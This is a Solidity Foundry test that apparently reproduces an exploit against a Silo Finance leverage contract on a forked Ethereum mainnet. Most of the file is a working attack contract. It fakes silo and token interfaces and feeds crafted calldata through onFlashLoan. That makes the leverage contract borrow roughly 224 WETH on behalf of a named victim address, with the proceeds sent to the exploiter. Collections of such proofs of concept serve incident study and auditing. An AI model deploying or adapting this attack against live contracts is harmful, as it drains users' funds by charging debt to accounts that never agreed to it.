// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import "../../interface/interface.sol";

interface ILeverageUsingSiloFlashloanWithGeneralSwap {
    function openLeveragePosition(
        FlashArgs calldata _flashArgs,
        bytes calldata _swapArgs,
        DepositArgs calldata _depositArgs
    ) external payable;

    function onFlashLoan(
        address _initiator,
        address _token,
        uint256 _amount,
        uint256 _fee,
        bytes calldata _data
    ) external returns (bytes32);
}

struct FlashArgs {
    address flashloanTarget;
    uint256 amount;
}

struct DepositArgs {
    ISilo silo;
    uint256 amount;
    ISilo.CollateralType collateralType;
}

struct SwapArgs {
    address exchangeProxy;
    address sellToken;
    address buyToken;
    address allowanceTarget;
    bytes swapCallData;
}

interface ISilo is IERC20 {
    enum CollateralType {
        Protected, // default
        Collateral
    }

    function maxBorrow(
        address _borrower
    ) external view returns (uint256 maxAssets);

    function borrow(
        uint256 _assets,
        address _receiver,
        address _borrower
    ) external virtual returns (uint256 shares);
}

contract SiloFinanceTest is Test {
    SiloFinanceExploit public attackContract;
    IERC20 public weth;
    function setUp() public {
        vm.createSelectFork("mainnet", 22781962 - 1);
        attackContract = new SiloFinanceExploit();
        weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    }

    function testExploit() public {
        attackContract.attack();
        console.log(
            "Exploiter WETH Balance: ",
            weth.balanceOf(tx.origin) / 1e18
        );
    }
}

contract SiloFinanceExploit {
    ILeverageUsingSiloFlashloanWithGeneralSwap public leverageContract;
    ISilo public exchangeProxySilo;
    IERC20 public siloDebtToken;

    address exploiter;
    address victimAddress;
    constructor() {
        leverageContract = ILeverageUsingSiloFlashloanWithGeneralSwap(
            0xCbEe4617ABF667830fe3ee7DC8d6f46380829DF9
        );
        exchangeProxySilo = ISilo(0x160287E2D3fdCDE9E91317982fc1Cc01C1f94085);
        exploiter = tx.origin;
        victimAddress = 0x60BAF994f44dd10c19C0c47cbFE6048a4fFe4860;
        siloDebtToken = IERC20(0x0a437aB5Cb5fE60ed4aE827D54bD0e5753f46Acb);
    }

    function attack() external {
        console.log(
            "Victim address debt Token Balance: ",
            siloDebtToken.balanceOf(victimAddress)
        );
        console.log(
            "Max borrow from victim address: ",
            exchangeProxySilo.maxBorrow(victimAddress) / 1e18
        );

        FlashArgs memory flashArgs = FlashArgs({
            flashloanTarget: address(this),
            amount: 0
        });

        bytes memory swapArgs = "";
        DepositArgs memory depositArgs = DepositArgs({
            silo: ISilo(address(this)),
            amount: 0,
            collateralType: ISilo.CollateralType.Collateral
        });

        leverageContract.openLeveragePosition(flashArgs, swapArgs, depositArgs);
        console.log(
            "Victim address debt Token Balance: ",
            siloDebtToken.balanceOf(victimAddress)
        );
        console.log(
            "Max borrow from victim address: ",
            exchangeProxySilo.maxBorrow(victimAddress) / 1e18
        );
    }

    function config() external returns (address) {
        return address(this);
    }

    function asset() external returns (address) {
        return address(this);
    }

    function allowance(address, address) external returns (uint256) {
        console.log("Allowance called");
        return 0;
    }

    function forceApprove(address, uint256) external returns (bool) {
        return true;
    }

    function balanceOf(address) external returns (uint256) {
        return 1;
    }

    function transferFrom(address, address, uint256) external returns (bool) {
        return true;
    }

    function approve(address, uint256) external returns (bool) {
        return true;
    }

    function deposit(uint256, address, uint8) external returns (bool) {
        return true;
    }

    function getSilos() external returns (address, address) {
        return (address(this), address(this));
    }

    function borrow(uint256, address, address) external returns (uint256) {
        return 0;
    }

    function flashLoan(
        address _receiver,
        address _token,
        uint256 _amount,
        bytes calldata
    ) external returns (bool) {
        DepositArgs memory _depositArgs = DepositArgs({
            silo: ISilo(address(this)),
            amount: 0,
            collateralType: ISilo.CollateralType.Collateral
        });

        bytes memory _swapData = abi.encodeWithSelector(
            ISilo.borrow.selector,
            224000000000000000000,
            exploiter,
            victimAddress
        );

        SwapArgs memory swapArgsStruct = SwapArgs({
            exchangeProxy: address(exchangeProxySilo),
            sellToken: address(this),
            buyToken: address(this),
            allowanceTarget: address(this),
            swapCallData: _swapData // borrow 함수 호출 데이터
        });

        bytes memory _swapArgs = abi.encode(swapArgsStruct);

        bytes memory data = abi.encode(_swapArgs, _depositArgs);

        leverageContract.onFlashLoan(address(this), _token, _amount, 0, data);

        return true;
    }

    receive() external payable {}
}
